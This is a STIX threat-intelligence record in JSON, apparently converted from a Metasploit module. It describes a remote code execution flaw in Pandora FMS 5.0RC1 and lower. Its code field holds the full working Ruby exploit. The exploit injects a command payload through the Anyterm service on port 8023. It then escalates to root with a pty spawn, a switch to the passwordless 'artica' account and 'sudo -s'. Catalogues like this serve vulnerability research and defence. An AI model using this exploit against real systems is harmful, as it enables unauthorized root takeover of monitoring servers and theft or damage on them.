{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0df54b31-4713-43f3-a3d5-2bae5f9a6372",
    "created": "2024-08-14T17:01:42.898103Z",
    "modified": "2024-08-14T17:01:42.898108Z",
    "name": "\"Pandora FMS Remote Code Execution\"",
    "description": " This module exploits a vulnerability found in Pandora FMS 5.0RC1 and lower. It will leverage an unauthenticated command injection in the Anyterm service on port 8023/TCP. Commands are executed as the user \"pandora\". In Pandora FMS 4.1 and 5.0RC1 the user \"artica\" is not assigned a password by default, which makes it possible to su to this user from the \"pandora\" user. The \"artica\" user has access to sudo without a password, which makes it possible to escalate privileges to root. However, Pandora FMS 4.0 and lower force a password for the \"artica\" user during installation.  'License'         => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/pandora_fms_exec.rb",
            "external_id": "pandora_fms_exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Pandora FMS Remote Code Execution\",\n      'Description'    => %q{\n        This module exploits a vulnerability found in Pandora FMS 5.0RC1 and lower.\n        It will leverage an unauthenticated command injection in the Anyterm service on\n        port 8023/TCP. Commands are executed as the user \"pandora\". In Pandora FMS 4.1 and 5.0RC1\n        the user \"artica\" is not assigned a password by default, which makes it possible to su\n        to this user from the \"pandora\" user. The \"artica\" user has access to sudo without a\n        password, which makes it possible to escalate privileges to root. However, Pandora FMS 4.0\n        and lower force a password for the \"artica\" user during installation.\n      },\n      'License'         => MSF_LICENSE,\n      'Author'          =>\n        [\n          'xistence <xistence[at]0x90.nl>' # Vulnerability discovery and Metasploit module\n        ],\n      'References'      =>\n        [\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\",\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic perl python',\n            }\n        },\n      'Platform'        => ['unix'],\n      'Arch'            => ARCH_CMD,\n      'Targets'         =>\n        [\n          ['Pandora 5.0RC1', {}]\n        ],\n      'Privileged'      => true,\n      'DisclosureDate'  => '2014-01-29',\n      'DefaultTarget'   => 0))\n\n    register_options(\n      [\n       Opt::RPORT(8023),\n       OptString.new('TARGETURI', [true, 'The base path to the Pandora instance', '/']),\n      ])\n  end\n\n  def on_new_session(client)\n    print_status(\"Trying to escalate privileges to root\")\n    [\n      # ignore SIGHUP so the server doesn't kill our root shell\n      \"trap '' HUP\",\n      # Spawn a pty for su/sudo\n      \"python -c 'import pty;pty.spawn(\\\"/bin/sh\\\")'\",\n      # Su to the passwordless \"artica\" account\n      \"su - artica\",\n      # The \"artica\" use has sudo rights without the need for a\n      # password, thus gain root priveleges\n      \"sudo -s\",\n    ].each do |command|\n      vprint_status(command)\n      client.shell_write(command + \"\\n\")\n    end\n\n    super\n  end\n\n  def check\n    # Check version\n    print_status(\"Trying to detect Pandora FMS Remote Gateway\")\n\n    res = send_request_cgi({\n     'method' => 'GET',\n     'uri'    => normalize_uri(target_uri.path, \"anyterm.html\")\n    })\n\n    if res && res.code == 200 && res.body.include?(\"Pandora FMS Remote Gateway\")\n      print_good(\"Pandora FMS Remote Gateway Detected!\")\n      return Exploit::CheckCode::Detected\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    print_status(\"Sending payload\")\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(target_uri.path, \"/anyterm-module\"),\n      'vars_post'   => {\n        'a'     => \"open\",\n        'p' => \"`#{payload.encoded}`\"\n      }\n    })\n\n    if !res || res.code != 200\n      fail_with(Failure::Unknown, \"#{peer} - Unexpected response, exploit probably failed!\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-01-29",
    "x_mitre_platforms": [
        "['unix']"
    ]
}